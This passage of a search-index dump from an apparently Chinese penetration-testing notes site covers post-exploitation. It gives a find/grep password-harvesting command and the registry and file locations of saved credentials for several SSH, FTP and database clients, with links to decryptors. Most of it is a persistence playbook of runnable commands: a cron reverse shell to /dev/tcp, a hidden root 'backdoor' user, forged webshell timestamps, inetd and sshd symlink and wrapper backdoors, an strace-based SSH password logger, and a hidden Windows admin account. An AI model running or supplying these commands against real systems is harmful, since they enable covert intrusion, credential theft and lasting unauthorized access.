\"=jdbc:|pass=|passwd=|aliyun|password\"","title":"\u672c\u673a\u654f\u611f\u4fe1\u606f\u6536\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E6%9C%AC%E6%9C%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%9C%AC%E6%9C%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_1","text":"find / -regex \".*\\.properties\\|.*\\.conf\\|.*\\.config\\|.*\\.sh|.*\\.jsp|.*\\.log|.*\\.txt|.*\\.xml\" | xargs grep -E \"=jdbc:|pass=|passwd=|aliyun|password\"","title":"\u672c\u673a\u654f\u611f\u4fe1\u606f\u6536\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/","text":"\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5bc6\u7801\u6293\u53d6 \u76ee\u5f55 XManager Navicat SecureCRT WINSCP FileZilla VNC realVNC MobaXterm XManager \u94fe\u63a5\u7684session\u6587\u4ef6\u4fdd\u5b58\u5728\u4ee5\u4e0b\u7684\u76ee\u5f55\u4e2d xshell7: C:\\Users\\%username%\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions xshell6: C:\\Users\\%username%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions XShell5: %userprofile%\\Documents\\NetSarang\\Xshell\\Sessions XFtp5: %userprofile%\\Documents\\NetSarang\\Xftp\\Sessions XShell6: %userprofile%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions XFtp6: %userprofile%\\Documents\\NetSarang Computer\\6\\Xftp\\Sessions \u6839\u636esession\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684version\u7248\u672c\uff0c\u5206\u4e3a\u4e0d\u540c\u7684\u5bc6\u7801\u52a0\u5bc6\u65b9\u6cd5 \u6839\u636eversion\u7248\u672c\u4e0d\u540c\uff0c\u53ef\u5206\u4e3a\u4e09\u79cd\u60c5\u51b5\uff1a version<5.1,version==5.1 or ==5.2,version>5.2 Navicat |MySQL|HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers\\`<your connection name>`| |MariaDB|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMARIADB\\Servers\\`<your connection name>`| |MongoDB|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMONGODB\\Servers\\`<your connection name>`| |Microsoft SQL|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMSSQL\\Servers\\`<your connection name>`| |Oracle|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatOra\\Servers\\`<your connection name>`| |PostgreSQL|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatPG\\Servers\\`<your connection name>`| |SQLite|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatSQLite\\Servers\\`<your connection name>`| \u5bc6\u7801\u5c31\u5728pwd\u91cc\u9762 \u52a0\u5bc6\u7b97\u6cd5\u6839\u636e\u7248\u672c\u7684\u4e0d\u540c\uff0c\u6709blowfish\u52a0\u5bc6\uff08\u6700\u5e38\u89c1\uff09\u548c AES128/CBC/PKCS7Padding \u3002 \u4e0b\u9762\u7684\u94fe\u63a5\u8bb2\u8ff0\u4e86Navicat\u7684\u52a0\u5bc6\u539f\u7406\u3002 https://github.com/HyperSine/how-does-navicat-encrypt-password/blob/master/doc/how-does-navicat-encrypt-password.md \u73b0\u6210\u7684\u5de5\u5177 https://github.com/HyperSine/how-does-navicat-encrypt-password SecureCRT ini\u6587\u4ef6\u5b58\u653e\u5728 C:\\Users\\user1\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\xxxx.ini 7.3.3\u7248\u672c\u524d\u7528\u7684\u662fblowfish-cbc \u52a0\u5bc6\u4e24\u6b21\uff0c\u540e\u9762\u7248\u672c\u5c31\u662fAES256-CBC https://github.com/HyperSine/how-does-SecureCRT-encrypt-password WINSCP host,username\u548c\u52a0\u5bc6\u7684password\u5b58\u50a8\u5728\u4e0b\u9762\u7684\u6ce8\u518c\u8868\u4e2d HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions password\u7684\u89e3\u5bc6\u9700\u8981\u7528\u5230host\u548cusername\uff0c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u811a\u672c\u8fdb\u884c\u89e3\u5bc6. \u5728winSCP 20\u7248\u672c\u4ee5\u540e\u5f3a\u5236\u4f7f\u7528Master Password\uff0c\u65e5\u4e0d\u4e86\u3002 https://github.com/anoopengineer/winscppasswd FileZilla FileZilla\u5982\u679c\u8bbe\u7f6e\u4e86\u4e3b\u5bc6\u7801\uff0c\u90a3\u5c31\u89e3\u4e0d\u5f00\u4e86. FileZilla\u6709\u4e24\u4e2a\u7248\u672cClient\u548cServer\uff0cClient\u7528\u4e8e\u94fe\u63a5\u5176\u4ed6FTP\u670d\u52a1\u5668\uff08\u5305\u62ecFileZilla\u642d\u5efa\u7684\u548c\u672c\u8eab\u81ea\u5e26\u7684\uff09\uff0cServer\u662f\u76f4\u63a5\u628a\u81ea\u5df1\u6574\u6210\u4e00\u4e2aFTP\u670d\u52a1\u5668\u7ed9Client\u94fe\u63a5 \u914d\u7f6e\u6587\u4ef6\u4e00\u822c\u4f1a\u5728C:\\Users\\conslu\\AppData\\Roaming\\FileZilla\\sitemanager.xml\uff0c\u5e76\u4e14\u5bc6\u7801\u662fbase64\u52a0\u5bc6\u7684\uff0chostname\u548cusername\u90fd\u662f\u660e\u6587\u3002 VNC vnc\u662f\u4e00\u7cfb\u5217\u4f18\u79c0\u7684\u8fdc\u7a0b\u63a7\u5236\u8f6f\u4ef6 RealVNC\uff1a\u7531VNC\u56e2\u961f\u90e8\u4efd\u6210\u5458\u5f00\u53d1\uff0c\u5206\u70ba\u5168\u529f\u80fd\u5546\u4e1a\u7248\u53ca\u514d\u8d39\u7248\u3002 TightVNC\uff1a\u5f3a\u8c03\u8282\u7701\u9891\u5bbd\u4f7f\u7528\u3002 UltraVNC\uff1a\u52a0\u5165\u4e86TightVNC\u7684\u90e8\u4efd\u7a0b\u5f0f\u53ca\u52a0\u5f3a\u6548\u80fd\u7684\u56fe\u578b\u6620\u5c04\u9a71\u52a8\u7a0b\u5f0f\uff0c\u5e76\u7ed3\u5408Active Directory\u53caNTLM\u7684\u5e10\u53f7\u5bc6\u7801\u8ba4\u8bc1\uff0c\u4f46\u4ec5\u6709Windows\u7248\u672c\u3002 Vine Viewer\uff1aMacOSX\u7684VNC\u7528\u6237\u7aef\u3002 realVNC MobaXterm ssh\u8fdc\u63a7\uff0c\u5982\u679c\u518d\u4fdd\u5b58\u5bc6\u7801\u65f6\u8bbe\u7f6e\u4e86Master Password\u90a3\u5c31\u65e0\u6cd5\u7834\u89e3\u4e86(Version 20.0\u540e\u5f3a\u5236\u4f7f\u7528Master Password\u52a0\u5bc6\u5bc6\u7801\uff09 \u5728\u6ca1\u6709Master Password\u7684\u60c5\u51b5\u4e0b\u63ed\u79d8\u5bc6\u7801\u9700\u8981\u5982\u4e0b\u6570\u636e HKCU\\SOFTWARE\\Mobatek\\MobaXterm \u83b7\u53d6SessionP HKCU\\SOFTWARE\\Mobatek\\MobaXterm\\P \u4ece\u8fd9\u4e2a\u952e\u503c\u53ef\u4ee5\u62ff\u5230ssh\u767b\u5f55\u7528\u6237\u540d\uff0cip\uff0c\u767b\u9646\u7684\u670d\u52a1\uff0c\u52a0\u5bc6\u7684\u5bc6\u7801 \u4ee5\u53ca\u5bf9\u5e94\u7684\u7528\u6237\u540d\u548c\u5f53\u524d\u673a\u5668\u540d \u811a\u672c\u5982\u4e0b https://github.com/HyperSine/how-does-MobaXterm-encrypt-password https://github.com/xillwillx/MobaXterm-Decryptor","title":"\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5bc6\u7801\u6293\u53d6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#_1","text":"","title":"\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5bc6\u7801\u6293\u53d6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#_2","text":"XManager Navicat SecureCRT WINSCP FileZilla VNC realVNC MobaXterm","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#xmanager","text":"\u94fe\u63a5\u7684session\u6587\u4ef6\u4fdd\u5b58\u5728\u4ee5\u4e0b\u7684\u76ee\u5f55\u4e2d xshell7: C:\\Users\\%username%\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions xshell6: C:\\Users\\%username%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions XShell5: %userprofile%\\Documents\\NetSarang\\Xshell\\Sessions XFtp5: %userprofile%\\Documents\\NetSarang\\Xftp\\Sessions XShell6: %userprofile%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions XFtp6: %userprofile%\\Documents\\NetSarang Computer\\6\\Xftp\\Sessions \u6839\u636esession\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684version\u7248\u672c\uff0c\u5206\u4e3a\u4e0d\u540c\u7684\u5bc6\u7801\u52a0\u5bc6\u65b9\u6cd5 \u6839\u636eversion\u7248\u672c\u4e0d\u540c\uff0c\u53ef\u5206\u4e3a\u4e09\u79cd\u60c5\u51b5\uff1a version<5.1,version==5.1 or ==5.2,version>5.2","title":"XManager"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#navicat","text":"|MySQL|HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers\\`<your connection name>`| |MariaDB|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMARIADB\\Servers\\`<your connection name>`| |MongoDB|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMONGODB\\Servers\\`<your connection name>`| |Microsoft SQL|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMSSQL\\Servers\\`<your connection name>`| |Oracle|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatOra\\Servers\\`<your connection name>`| |PostgreSQL|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatPG\\Servers\\`<your connection name>`| |SQLite|HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatSQLite\\Servers\\`<your connection name>`| \u5bc6\u7801\u5c31\u5728pwd\u91cc\u9762 \u52a0\u5bc6\u7b97\u6cd5\u6839\u636e\u7248\u672c\u7684\u4e0d\u540c\uff0c\u6709blowfish\u52a0\u5bc6\uff08\u6700\u5e38\u89c1\uff09\u548c AES128/CBC/PKCS7Padding \u3002 \u4e0b\u9762\u7684\u94fe\u63a5\u8bb2\u8ff0\u4e86Navicat\u7684\u52a0\u5bc6\u539f\u7406\u3002 https://github.com/HyperSine/how-does-navicat-encrypt-password/blob/master/doc/how-does-navicat-encrypt-password.md \u73b0\u6210\u7684\u5de5\u5177 https://github.com/HyperSine/how-does-navicat-encrypt-password","title":"Navicat"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#securecrt","text":"ini\u6587\u4ef6\u5b58\u653e\u5728 C:\\Users\\user1\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\xxxx.ini 7.3.3\u7248\u672c\u524d\u7528\u7684\u662fblowfish-cbc \u52a0\u5bc6\u4e24\u6b21\uff0c\u540e\u9762\u7248\u672c\u5c31\u662fAES256-CBC https://github.com/HyperSine/how-does-SecureCRT-encrypt-password","title":"SecureCRT"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#winscp","text":"host,username\u548c\u52a0\u5bc6\u7684password\u5b58\u50a8\u5728\u4e0b\u9762\u7684\u6ce8\u518c\u8868\u4e2d HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions password\u7684\u89e3\u5bc6\u9700\u8981\u7528\u5230host\u548cusername\uff0c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u811a\u672c\u8fdb\u884c\u89e3\u5bc6. \u5728winSCP 20\u7248\u672c\u4ee5\u540e\u5f3a\u5236\u4f7f\u7528Master Password\uff0c\u65e5\u4e0d\u4e86\u3002 https://github.com/anoopengineer/winscppasswd","title":"WINSCP"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#filezilla","text":"FileZilla\u5982\u679c\u8bbe\u7f6e\u4e86\u4e3b\u5bc6\u7801\uff0c\u90a3\u5c31\u89e3\u4e0d\u5f00\u4e86. FileZilla\u6709\u4e24\u4e2a\u7248\u672cClient\u548cServer\uff0cClient\u7528\u4e8e\u94fe\u63a5\u5176\u4ed6FTP\u670d\u52a1\u5668\uff08\u5305\u62ecFileZilla\u642d\u5efa\u7684\u548c\u672c\u8eab\u81ea\u5e26\u7684\uff09\uff0cServer\u662f\u76f4\u63a5\u628a\u81ea\u5df1\u6574\u6210\u4e00\u4e2aFTP\u670d\u52a1\u5668\u7ed9Client\u94fe\u63a5 \u914d\u7f6e\u6587\u4ef6\u4e00\u822c\u4f1a\u5728C:\\Users\\conslu\\AppData\\Roaming\\FileZilla\\sitemanager.xml\uff0c\u5e76\u4e14\u5bc6\u7801\u662fbase64\u52a0\u5bc6\u7684\uff0chostname\u548cusername\u90fd\u662f\u660e\u6587\u3002","title":"FileZilla&#x20;"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#vnc","text":"vnc\u662f\u4e00\u7cfb\u5217\u4f18\u79c0\u7684\u8fdc\u7a0b\u63a7\u5236\u8f6f\u4ef6 RealVNC\uff1a\u7531VNC\u56e2\u961f\u90e8\u4efd\u6210\u5458\u5f00\u53d1\uff0c\u5206\u70ba\u5168\u529f\u80fd\u5546\u4e1a\u7248\u53ca\u514d\u8d39\u7248\u3002 TightVNC\uff1a\u5f3a\u8c03\u8282\u7701\u9891\u5bbd\u4f7f\u7528\u3002 UltraVNC\uff1a\u52a0\u5165\u4e86TightVNC\u7684\u90e8\u4efd\u7a0b\u5f0f\u53ca\u52a0\u5f3a\u6548\u80fd\u7684\u56fe\u578b\u6620\u5c04\u9a71\u52a8\u7a0b\u5f0f\uff0c\u5e76\u7ed3\u5408Active Directory\u53caNTLM\u7684\u5e10\u53f7\u5bc6\u7801\u8ba4\u8bc1\uff0c\u4f46\u4ec5\u6709Windows\u7248\u672c\u3002 Vine Viewer\uff1aMacOSX\u7684VNC\u7528\u6237\u7aef\u3002","title":"VNC"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#realvnc","text":"","title":"realVNC"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/#mobaxterm","text":"ssh\u8fdc\u63a7\uff0c\u5982\u679c\u518d\u4fdd\u5b58\u5bc6\u7801\u65f6\u8bbe\u7f6e\u4e86Master Password\u90a3\u5c31\u65e0\u6cd5\u7834\u89e3\u4e86(Version 20.0\u540e\u5f3a\u5236\u4f7f\u7528Master Password\u52a0\u5bc6\u5bc6\u7801\uff09 \u5728\u6ca1\u6709Master Password\u7684\u60c5\u51b5\u4e0b\u63ed\u79d8\u5bc6\u7801\u9700\u8981\u5982\u4e0b\u6570\u636e HKCU\\SOFTWARE\\Mobatek\\MobaXterm \u83b7\u53d6SessionP HKCU\\SOFTWARE\\Mobatek\\MobaXterm\\P \u4ece\u8fd9\u4e2a\u952e\u503c\u53ef\u4ee5\u62ff\u5230ssh\u767b\u5f55\u7528\u6237\u540d\uff0cip\uff0c\u767b\u9646\u7684\u670d\u52a1\uff0c\u52a0\u5bc6\u7684\u5bc6\u7801 \u4ee5\u53ca\u5bf9\u5e94\u7684\u7528\u6237\u540d\u548c\u5f53\u524d\u673a\u5668\u540d \u811a\u672c\u5982\u4e0b https://github.com/HyperSine/how-does-MobaXterm-encrypt-password https://github.com/xillwillx/MobaXterm-Decryptor","title":"MobaXterm"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","text":"\u6743\u9650\u7ef4\u6301 win\\&linux\u672c\u5730\u6743\u9650\u7ef4\u6301","title":"\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_1","text":"win\\&linux\u672c\u5730\u6743\u9650\u7ef4\u6301","title":"\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","text":"win\\&linux\u672c\u5730\u6743\u9650\u7ef4\u6301 \u76ee\u5f55 LINUX cron \u9690\u85cf\u6587\u4ef6 \u521b\u5efa\u6076\u610f\u7ba1\u7406\u5458\u7528\u6237 \u65f6\u95f4\u6233\u4fee\u6539 inetd \u5feb\u901f\u83b7\u53d6ssh\u94fe\u63a5(\u8f6f\u8fde\u63a5\u540e\u95e8) Wrapper\u540e\u95e8 SSH keylogger WINDOWS \u5f71\u5b50\u7528\u6237 \\$ \u7b26\u53f7 \u4fee\u6539\u6ce8\u518c\u8868 \u542f\u52a8\u9879 \u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879 \u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8 \u670d\u52a1 \u8ba1\u5212\u4efb\u52a1 \u9690\u85cf Logon Scripts \u7ec4\u7b56\u7565\u540e\u95e8 \u542f\u7528GUEST BITSADMIN\u540e\u95e8 WMI \u4f7f\u7528WMI\u5b58\u50a8\u4fe1\u606f \u8fc7\u6ee4\u5668+\u5904\u7406\u5668 \u6587\u4ef6\u9690\u85cf LINUX cron \u521b\u5efa\u4e2a\u6587\u4ef6\uff08\u5047\u8bbe\u4e3a/a/b)\uff0c\u91cc\u9762\u7684\u6838\u5fc3\u5185\u5bb9\u662f\u5f39\u4e2ashell\u56de\u6765 \uff08\u6700\u597d\u5728\u6587\u4ef6\u524d\u52a0\u4e0a#!/bin/bash\uff09 \u7136\u540echmod +xs /a/b \u7136\u540e\u4fee\u6539/etc/crontab,\u8fd9\u91cc\u662f\u6bcf\u5206\u949f\u6267\u884c\u4e00\u6b21 */1 * * * * root /a/b \u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u65e0\u6587\u4ef6\u843d\u5730\u3002 \u4f46\u662f\u9700\u8981\u4fee\u6539\u4e00\u4e2a\u5730\u65b9 vim /etc/crontab \u5c06SEHLL\u6539\u4e3a/bin/bash \u7136\u540e\u5199\u5165 bash -i >& /dev/tcp/xxx/xxx 0>&1 \u9690\u85cf\u6587\u4ef6 \u521b\u5efa.xxx\u6587\u4ef6\u5373\u4e3a\u9690\u85cf\u6587\u4ef6\uff0cls\u662f\u770b\u4e0d\u5230\u7684\uff0c\u53ea\u6709\u901a\u8fc7ls -al\u624d\u80fd\u770b\u5230 \u7f51\u4e0a\u8fd8\u770b\u5230\u4e00\u4e2a\u521b\u5efa\u6587\u4ef6\u540d\u5b57\u4e3a...\u7684\u65b9\u6cd5\uff0c\u4e0d\u77e5\u9053\u5b9e\u7528\u6027\u5982\u4f55 \u521b\u5efa\u6076\u610f\u7ba1\u7406\u5458\u7528\u6237 useradd -o -u 0 backdoor \u7136\u540e\u4e3a\u5176\u8bbe\u7f6e\u4e2a\u5bc6\u7801\u4ee5\u4fbfssh\u767b\u5f55\uff0c\u767b\u4e0a\u53bb\u5c31\u662froot \u65f6\u95f4\u6233\u4fee\u6539 \u540e\u95e8\u7684\u65f6\u95f4\u6233\u9700\u8981\u6539\u6539\uff0c\u4e0d\u7136\u592a\u5bb9\u6613\u88ab\u770b\u51fa\u6765\uff0c\u522b\u4eba\u4e00\u4e2als -al\u5c31\u770b\u7834\u4e86 touch -r index.php webshell.php \u5c06index.php\u7684\u65f6\u95f4\u8d4b\u4e88webshell.php touch -t 1401021042.30 webshell.php 2014\u5e741\u67082\u65e510\u70b942\u520630\u79d2\u8d4b\u4e88webshell.php inetd \u9700\u8981inetd\u88ab\u5b89\u88c5 apt-get install openbsd-inetd \u4fee\u6539\u6587\u4ef6/etc/inetd.conf \u7136\u540e\u91cd\u542finetd ps -ef | grep inetd root 1928 1470 0 14:20 pts/0 00:00:00 grep inetd kill 1928 \u7136\u540e\u53e6\u4e00\u53f0\u4e3b\u673a nc -vv ip 13(\u9ed8\u8ba4\u7aef\u53e313) \u5373\u53ef\u83b7\u5f97\u4ee5\u4e0b\u573a\u666f \u9ed8\u8ba4\u7aef\u53e3\u6539\u6cd5: \u4fee\u6539/etc/services\u6587\u4ef6\uff0c\u52a0\u5165\u4ee5\u4e0b\u7684\u4e1c\u897f test 6666/tcp \u7136\u540e\u4fee\u6539/etc/inetd.conf ,\u5728daytime\u9644\u8fd1 test stream tcp nowait root /bin/bash bash -i \u5feb\u901f\u83b7\u53d6ssh\u94fe\u63a5(\u8f6f\u8fde\u63a5\u540e\u95e8) ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; \u53d7\u5bb3\u673a\u4e0a\u6267\u884c \u7136\u540e\u6211\u4eec ssh root@xxx.x.x.xx -p 31337 \u968f\u4fbf\u8f93\u4e2a\u5bc6\u7801\u5c31\u8fdb\u53bb\u4e86 Wrapper\u540e\u95e8 cd /usr/sbin mv sshd ../bin echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if (getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec {\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd //\u4e0d\u7528\u91cd\u542f\u4e5f\u884c /etc/init.d/sshd restart kali\u4e0b\u7684\u6267\u884c ##!bash socat STDIO TCP4:192.168.206.142:22,sourceport=13377 \u5373\u53ef\u5f00\u59cb\u63a7\u5236 \u6e90\u7aef\u53e3\u4fee\u6539 ##!python >>> import struct >>> buffer = struct.pack('>I6',19526) >>> print repr(buffer) '\\x00\\x00LF' >>> buffer = struct.pack('>I6',13377) >>> print buffer 4A \u6ca1\u6709\u94fe\u63a5\u7684\u60c5\u51b5\u4e0b\u662f\u65e0\u6cd5\u770b\u5230\u8fdb\u7a0b\u7684\uff0clast\u4e5f\u770b\u4e0d\u5230\u767b\u5f55\uff0c\u5f88\u9690\u853d SSH keylogger vim\u5f53\u524d\u7528\u6237\u7684.bashrc\u6587\u4ef6 \\~/.bashrc\uff0c\u672b\u5c3e\u6dfb\u52a0 alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' \u7136\u540e\u6267\u884c\u547d\u4ee4 source .bashrc,\u4f7f\u914d\u7f6e\u751f\u6548\u3002 \u968f\u540e\u5f53\u672c\u5730su\u6216\u8005ssh\u65f6\uff0c\u64cd\u4f5c\u8bb0\u5f55\u5c31\u4f1a\u88ab\u8bb0\u5f55\u5230/tmp\u76ee\u5f55\u4e0b\u3002 WINDOWS \u5f71\u5b50\u7528\u6237 \\$ \u7b26\u53f7 net user ddd$ /add net localgroup administrators ddd$ /add \u8fd9\u6837\u7684\u8bdd\uff0cnet user\u547d\u4ee4\u5c31\u770b\u4e0d\u5230\u8fd9\u4e2a\u7528\u6237\u4e86 